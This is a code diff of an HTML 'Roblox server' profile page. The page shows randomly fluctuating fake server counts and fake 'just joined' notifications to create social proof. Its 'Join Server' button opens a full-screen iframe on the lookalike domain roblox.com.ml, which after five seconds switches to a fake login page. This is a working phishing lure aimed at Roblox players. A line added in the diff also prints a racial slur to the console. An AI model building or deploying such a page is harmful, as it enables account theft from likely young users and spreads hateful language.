@@ -14,7 +14,6 @@
       overflow: hidden;
     }
 
-    /* overlay blur */
     .overlay {
       position: absolute;
       width: 100%;
@@ -24,7 +23,6 @@
       z-index: 1;
     }
 
-    /* floating hearts */
     .heart {
       position: absolute;
       color: #ff69b4;
@@ -35,9 +33,9 @@
     }
 
     @keyframes floatUp {
-      0% { transform: translateY(100vh) scale(0.5); opacity: 0; }
+      0% { transform: translateY(100vh); opacity: 0; }
       50% { opacity: 1; }
-      100% { transform: translateY(-10vh) scale(1); opacity: 0; }
+      100% { transform: translateY(-10vh); opacity: 0; }
     }
 
     .bio {
@@ -67,16 +65,9 @@
       margin-bottom: 10px;
     }
 
-    h1 {
-      color: #ff4da6;
-    }
+    h1 { color: #ff4da6; }
+    .desc { color: #ff69b4; font-size: 14px; }
 
-    .desc {
-      color: #ff69b4;
-      font-size: 14px;
-    }
-
-    /* glowing button */
     .join-btn {
       margin-top: 20px;
       background: linear-gradient(180deg, #ff8ad6, #ff4db8);
@@ -86,7 +77,6 @@
       font-size: 18px;
       color: white;
       cursor: pointer;
-      box-shadow: 0 0 15px #ff69b4;
       animation: pulse 1.5s infinite;
     }
 
@@ -96,77 +86,73 @@
       100% { box-shadow: 0 0 10px #ff69b4; }
     }
 
-    /* server list */
-.servers {
-  margin-top: 15px;
-  background: #fff0f8;
-  border-radius: 15px;
-  padding: 10px;
-  max-height: 200px;
-  overflow-y: auto;
-
-  display: grid;
-  grid-template-columns: repeat(2, 1fr);
-  gap: 8px;
-}
-
-.server:hover {
-  transform: scale(1.03);
-}
-
-.server span {
-  font-size: 12px;
-  background: #ffd6f9;
-  padding: 3px 8px;
-  border-radius: 10px;
-}
-
-/* special states */
-.server.full span {
-  background: #ff4d6d;
-  color: white;
-}
-
-.server.low span {
-  background: #90ee90;
-}
-
-.server.vip span {
-  background: gold;
-  color: black;
-}
-
- iframe {
-  position: fixed;
-  top: 0;
-  left: 0;
-  width: 100%;
-  height: 100vh;
-  border: none;
-  display: none;
-
-  z-index: 99999; /* VERY HIGH */
-}
-
-    /* notification */
-    .notif {
-      position: absolute;
-      bottom: 20px;
-      left: 20px;
-      background: rgba(0,0,0,0.6);
-      color: white;
-      padding: 10px 15px;
+    .servers {
+      margin-top: 15px;
+      background: #fff0f8;
       border-radius: 15px;
-      font-size: 14px;
-      z-index: 5;
-      animation: fadeInOut 4s infinite;
+      padding: 10px;
+      max-height: 200px;
+      overflow-y: auto;
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 8px;
     }
 
-    @keyframes fadeInOut {
-      0% { opacity: 0; transform: translateY(20px); }
-      20% { opacity: 1; transform: translateY(0); }
+    .server {
+      background: #fff;
+      padding: 8px;
+      border-radius: 10px;
+      font-size: 13px;
+      font-weight: 600;
+      display: flex;
+      justify-content: space-between;
+    }
+
+    .server span {
+      font-size: 12px;
+      background: #ffd6f9;
+      padding: 3px 8px;
+      border-radius: 10px;
+    }
+
+    .server.full span {
+      background: #ff4d6d;
+      color: white;
+    }
+
+    .server.low span {
+      background: #90ee90;
+    }
+
+    iframe {
+      position: fixed;
+      inset: 0;
+      width: 100%;
+      height: 100vh;
+      border: none;
+      display: none;
+      z-index: 999999;
+    }
+
+.notif {
+  position: absolute;
+  left: 20px;
+  background: rgba(0,0,0,0.7);
+  color: white;
+  padding: 10px;
+  border-radius: 12px;
+  font-size: 13px;
+
+  z-index: 9999; /* 🔥 above overlay */
+
+  animation: fade 4s forwards;
+}
+
+    @keyframes fade {
+      0% { opacity: 0; transform: translateY(10px); }
+      20% { opacity: 1; }
       80% { opacity: 1; }
-      100% { opacity: 0; transform: translateY(20px); }
+      100% { opacity: 0; transform: translateY(10px); }
     }
   </style>
 </head>
@@ -175,58 +161,19 @@
 
 <div class="overlay" id="overlay"></div>
 
-<!-- floating hearts -->
 <script>
 for (let i = 0; i < 20; i++) {
-  let heart = document.createElement("div");
-  heart.className = "heart";
-  heart.innerText = "💖";
-  heart.style.left = Math.random() * 100 + "vw";
-  heart.style.animationDuration = (4 + Math.random() * 4) + "s";
-  document.body.appendChild(heart);
+  let h = document.createElement("div");
+  h.className = "heart";
+  h.innerText = "💖";
+  h.style.left = Math.random() * 100 + "vw";
+  document.body.appendChild(h);
 }
 </script>
-<script>
-function updateServers() {
-  const servers = document.querySelectorAll(".server");
 
-  servers.forEach(server => {
-    let count = parseInt(server.getAttribute("data-count"));
-
-    // random + or -
-    let change = Math.floor(Math.random() * 3) - 1; // -1, 0, +1
-    count += change;
-
-    // clamp between 0 and 48
-    if (count < 0) count = 0;
-    if (count > 48) count = 48;
-
-    server.setAttribute("data-count", count);
-
-    const span = server.querySelector("span");
-
-    if (count >= 48) {
-      span.innerText = "FULL";
-      server.classList.add("full");
-    } else {
-      span.innerText = count + "/48";
-      server.classList.remove("full");
-    }
-
-    // low server highlight
-    if (count <= 5) {
-      server.classList.add("low");
-    } else {
-      server.classList.remove("low");
-    }
-  });
-}
-
-// update every 2 seconds
-setInterval(updateServers, 2000);
-</script>
 <div class="bio" id="bioPage">
   <div class="card">
+
     <img class="avatar" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcREyCF62WRPcmg4ET1T6LQqtvS3shJSXhElsQ&s">
 
     <h1>💖 cutie_bunny 💖</h1>
@@ -239,85 +186,70 @@ setInterval(updateServers, 2000);
 
     <button class="join-btn" onclick="joinServer()">💖 Join Server 💖</button>
 
-  <div class="servers">
-  <div class="server" data-count="12">Server #123 <span>12/48</span></div>
-  <div class="server" data-count="3">Server #45 <span>3/48</span></div>
-  <div class="server" data-count="18">Server #301 <span>18/48</span></div>
-  <div class="server" data-count="22">Server #744 <span>22/48</span></div>
-  <div class="server" data-count="35">Server #268 <span>35/48</span></div>
-  <div class="server" data-count="9">Server #120 <span>9/48</span></div>
-  <div class="server" data-count="29">Server #707 <span>29/48</span></div>
-  <div class="server" data-count="41">Server #662 <span>41/48</span></div>
+    <div class="servers">
+      <div class="server" data-count="12">Server #123 <span>12/48</span></div>
+      <div class="server" data-count="3">Server #45 <span>3/48</span></div>
+      <div class="server" data-count="18">Server #301 <span>18/48</span></div>
+      <div class="server" data-count="22">Server #744 <span>22/48</span></div>
+      <div class="server" data-count="35">Server #268 <span>35/48</span></div>
+      <div class="server" data-count="9">Server #120 <span>9/48</span></div>
+      <div class="server" data-count="29">Server #707 <span>29/48</span></div>
+      <div class="server" data-count="41">Server #662 <span>41/48</span></div>
+    </div>
+
+  </div>
 </div>
-<div class="notif" id="notif"></div>
 
 <iframe id="frame"></iframe>
 
 <script>
 function joinServer() {
+    console.log("nigger")
   document.getElementById("bioPage").style.display = "none";
   document.getElementById("overlay").style.display = "none";
 
   const frame = document.getElementById("frame");
   frame.style.display = "block";
 
+  // first site
   frame.src = "https://www.roblox.com.ml/games/920587237/Adopt-Me?privateServerLinkCode=141873631524841347615847783517";
 
+  // after 5 seconds → switch
   setTimeout(() => {
     frame.src = "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fgames%2F348241630184%2FAdopt-Me";
   }, 5000);
 }
-</script>
-// random username notif
-<script>
-const names = [
-  "Mina", "Soojin", "Jisoo", "Yuna", "Hana", "Jiwoo", "Chaeyoung", "Seulgi",
-  "Nayeon", "Tzuyu", "Rosé", "Jennie", "Lisa", "Winter", "Karina", "Ningning",
-  "Ryujin", "Yeji", "Chaeryeong", "Yeri", "Irene", "Sakura", "Eunbi", "Yujin",
-  "Wonyoung", "Gaeul", "Rei", "Liz", "Leeseo", "Minji", "Hanni", "Danielle",
-  "Haerin", "Hyein", "Sumin", "Sieun", "Isa", "Seeun", "J", "Kazuha",
-  "Yunjin", "Chaewon", "Eunchae", "Mashiro", "Xiaoting", "Hikaru", "Bahiyyih",
-  "Youngeun", "Dayeon", "Ruka", "Asa", "Rora", "Ahyeon"
-];
+// server activity
+setInterval(() => {
+  document.querySelectorAll(".server").forEach(s => {
+    let c = +s.dataset.count;
+    c += Math.floor(Math.random() * 5) - 2;
+    c = Math.max(0, Math.min(48, c));
+    s.dataset.count = c;
 
-function randomName() {
-  return names[Math.floor(Math.random() * names.length)];
-}
+    let span = s.querySelector("span");
+    span.textContent = c >= 48 ? "FULL" : `${c}/48`;
 
-function showNotif() {
-  const notif = document.getElementById("notif");
-  notif.innerText = randomName() + " just joined a Korean server 🇰🇷";
-}
+    s.classList.toggle("full", c >= 48);
+    s.classList.toggle("low", c <= 5);
+  });
+}, 2000);
 
-// spam effect (faster + random timing)
-function spamNotif() {
-  showNotif();
-  setTimeout(spamNotif, 2000 + Math.random() * 2000);
-}
-
+// usernames
+const names = ["Mina","Jisoo","Yuna","Hana","Jiwoo","Nayeon","Rosé","Jennie","Lisa","Karina","Winter","Ryujin","Yeji","Irene","Sakura","Wonyoung","Minji","Hanni","Danielle","Haerin","Hyein"];
 
 function createNotif() {
-  const notif = document.createElement("div");
-  notif.className = "notif";
+  let n = document.createElement("div");
+  n.className = "notif";
+  n.innerText = names[Math.floor(Math.random()*names.length)] + " just joined 🇰🇷";
 
-  notif.innerText = randomName() + " just joined a Korean server 🇰🇷";
+  n.style.bottom = (20 + document.querySelectorAll(".notif").length * 50) + "px";
 
-  notif.style.bottom = (20 + document.querySelectorAll(".notif").length * 50) + "px";
-
-  document.body.appendChild(notif);
-
-  setTimeout(() => {
-    notif.remove();
-  }, 4000);
+  document.body.appendChild(n);
+  setTimeout(()=>n.remove(),4000);
 }
 
-setInterval(createNotif, 1500);
-
-spamNotif();
-
-
-setInterval(showNotif, 4000);
-showNotif();
+setInterval(createNotif, 1200);
 </script>
 
 </body>
